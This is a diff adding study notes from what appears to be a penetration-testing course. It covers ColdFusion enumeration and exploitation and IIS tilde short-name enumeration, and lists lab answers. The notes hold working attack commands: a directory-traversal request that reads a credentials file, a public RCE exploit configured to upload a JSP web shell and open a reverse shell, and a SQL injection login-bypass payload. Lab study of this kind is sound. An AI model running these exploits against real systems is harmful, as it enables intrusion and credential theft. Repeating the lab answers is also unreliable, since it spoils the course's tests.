@@ -1150,3 +1150,174 @@ Result: logged in as admin role → ServerStatus → Uname / Users / Netstat / *
 - Docker container (fatty server): `172.16.17.114:1337`
 - UNION injection payload — Username: `abc' UNION SELECT 1,'abc','a@b.com','abc','admin` / Password: `abc`
 - Flag (Section 22 answer): eth0 IP = `172.28.0.3`
+
+---
+
+## Section 23 — ColdFusion: Discovery & Enumeration
+
+### What Is ColdFusion
+- Web application platform based on Java; developed by Allaire (1995), acquired by Macromedia then Adobe
+- Uses CFML (ColdFusion Markup Language) — HTML-like tag syntax for database integration, web services, email, etc.
+- Current stable version at time of writing: ColdFusion 2021
+
+### Default Ports
+| Port | Protocol | Notes |
+|------|----------|-------|
+| 80 | HTTP | Standard web |
+| 443 | HTTPS | Standard web (TLS) |
+| 1935 | RPC | Remote Procedure Call |
+| 25 | SMTP | Email |
+| 8500 | SSL | ColdFusion default web interface |
+| 5500 | Server Monitor | Remote administration of the CF server |
+
+### Enumeration Methods
+| Method | What to Look For |
+|--------|-----------------|
+| Port scan | Port 8500 (SSL) or 5500 (Server Monitor) strongly indicate ColdFusion |
+| File extensions | `.cfm` and `.cfc` files in URLs |
+| HTTP headers | `Server: ColdFusion` or `X-Powered-By: ColdFusion` |
+| Error messages | References to CFML tags or functions |
+| Default files | `CFIDE/administrator/index.cfm`, `admin.cfm` |
+
+### Key Enumeration Indicators
+- Root directory listing with `CFIDE/` and `cfdocs/` folders → ColdFusion confirmed
+- `/CFIDE/administrator/` → ColdFusion Administrator login page; reveals exact version
+- `.cfm` extension on files in directory listing → CFML in use
+
+### Nmap Example
+```
+nmap -p- -sC -Pn <target> --open
+```
+Port 8500 shows as `fmtp` in Nmap output — that's the ColdFusion SSL port.
+
+### Known CVEs (for reference)
+- CVE-2021-21087: Arbitrary disallow of uploading JSP source code
+- CVE-2020-24450: Command injection
+- CVE-2020-24449: Arbitrary file read
+- CVE-2010-2861: Directory traversal (ColdFusion 9.0.1 and earlier)
+- CVE-2009-2265: Unauthenticated RCE via FCKeditor file upload (CF 8.0.1 and earlier)
+
+### Lab Answers
+- Section 23 question: Port 5500 → **Server Monitor**
+
+---
+
+## Section 24 — Attacking ColdFusion
+
+### Workflow: ColdFusion Attack Chain
+1. Identify version via `/CFIDE/administrator/` login page
+2. Run `searchsploit adobe coldfusion` — filter results by version
+3. For CF 8: two primary exploits — directory traversal (CVE-2010-2861) and unauthenticated RCE (CVE-2009-2265)
+4. Use traversal first to extract `password.properties` (contains encrypted admin password)
+5. Use RCE exploit to land a reverse shell
+
+### Tool: searchsploit
+```
+searchsploit adobe coldfusion
+searchsploit -p <edb-id>          # get full path and copy to clipboard
+cp /usr/share/exploitdb/exploits/<path>/<file>.py .
+```
+
+### CVE-2010-2861 — Directory Traversal (EDB-ID 14641)
+- Affects: ColdFusion 9.0.1 and earlier
+- Vulnerable endpoints: `CFIDE/administrator/settings/mappings.cfm`, `logging/settings.cfm`, `datasources/index.cfm`, `j2eepackaging/editarchive.cfm`, `CFIDE/administrator/enter.cfm`
+- Attack: manipulate `locale` parameter with `../` sequences to read arbitrary files
+
+```
+python2 14641.py <host> <port> <file_path>
+python2 14641.py 10.129.204.230 8500 "../../../../../../../../ColdFusion8/lib/password.properties"
+```
+
+- `password.properties` is at `[cf_root]/lib/password.properties` — contains encrypted passwords for DB connections, mail, LDAP, etc.
+- Successful output includes `password=<hash>` and `encrypted=true`
+
+### CVE-2009-2265 — Unauthenticated RCE (EDB-ID 50057)
+- Affects: ColdFusion 8.0.1 and earlier
+- Entry point: FCKeditor file upload at `/CFIDE/scripts/ajax/FCKeditor/editor/filemanager/connectors/cfm/upload.cfm`
+- Exploit uploads a JSP web shell then triggers it for a reverse shell
+
+```
+cp /usr/share/exploitdb/exploits/cfm/webapps/50057.py .
+```
+
+Edit these four variables in the script before running:
+```python
+lhost = '<your tun0 IP>'
+lport = 4444
+rhost = '<target IP>'
+rport = 8500
+```
+
+```
+python3 50057.py
+```
+
+- Script generates a JSP payload, uploads it via FCKeditor, deletes it after, then triggers it — lands a Windows cmd shell
+- Takes 30–90 seconds; target VM can be slow
+
+### What Works / What Doesn't
+- Directory traversal (14641.py) requires `python2` — will fail with python3
+- RCE (50057.py) requires `python3`
+- VM response time can be up to 90 seconds — be patient before assuming failure
+- Shell lands in `C:\ColdFusion8\runtime\bin\` as a low-privileged user
+
+### Lab Answers
+- Target: `10.129.48.211` (ACADEMY-ACA-ARCTIC)
+- ColdFusion running as: `arctic\tolis`
+
+---
+
+## Section 25 — IIS Tilde Enumeration
+
+### What Is IIS Tilde Enumeration
+- Technique to discover hidden files, directories, and 8.3 short file names on vulnerable IIS servers
+- Windows auto-generates 8.3 short names for every file/folder (e.g. `SecretDocuments` → `SECRET~1`)
+- Tilde (`~`) + sequence number in a URL can reference the short name directly
+- Vulnerability: IIS responds differently (200 vs 404) to valid vs invalid short name prefixes, allowing character-by-character brute-force
+
+### 8.3 Short Name Format
+- Max 8 chars for name, `.`, max 3 chars for extension
+- If two files share a prefix, they get `~1`, `~2`, etc. to distinguish them
+- Example: `somefile.txt` → `somefi~1.txt`, `somefile1.txt` → `somefi~2.txt`
+
+### Affected Versions
+- IIS 7.5 and earlier are commonly vulnerable
+
+### Tool: IIS-ShortName-Scanner
+- Java tool; requires Oracle JRE
+- Sends OPTIONS requests with tilde sequences to enumerate short names
+
+```
+java -jar iis_shortname_scanner.jar 0 5 http://<target>/
+```
+
+- Hit Enter (No) when prompted for proxy
+- Output: lists identified short-name directories and files
+- Short names are truncated — need a second step to recover full names
+
+### Recovering Full Filenames from Short Names
+Two-step process after getting a short name prefix (e.g. `TRANSF~1.ASP`):
+
+**Step 1 — generate a targeted wordlist:**
+```
+egrep -r ^transf /usr/share/wordlists/* | sed 's/^[^:]*://' > /tmp/list.txt
+```
+(Replace `transf` with whatever prefix the scanner found — lowercase)
+
+**Step 2 — brute-force with gobuster:**
+```
+gobuster dir -u http://<target>/ -w /tmp/list.txt -x .aspx,.asp
+```
+
+- `-x .aspx,.asp` appends extensions; match against the extension hint from the short name
+- Gobuster returns the full filename when it gets a 200
+
+### What Works / What Doesn't
+- IIS ShortName Scanner uses OPTIONS method — some servers block OPTIONS but are still vulnerable via GET; try both
+- If no wordlist entries start with the prefix, the scanner may have found something non-standard — try `SecLists` wordlists
+- Short name extension `.ASP` can map to `.aspx` — always try both extensions in gobuster
+
+### Lab Answers
+- Target: `10.129.48.213` (ACADEMY-ACA-BOUNTY), IIS 7.5 on port 80
+- Short name found by scanner: `TRANSF~1.ASP`
+- Full filename (gobuster): `transfer.aspx`
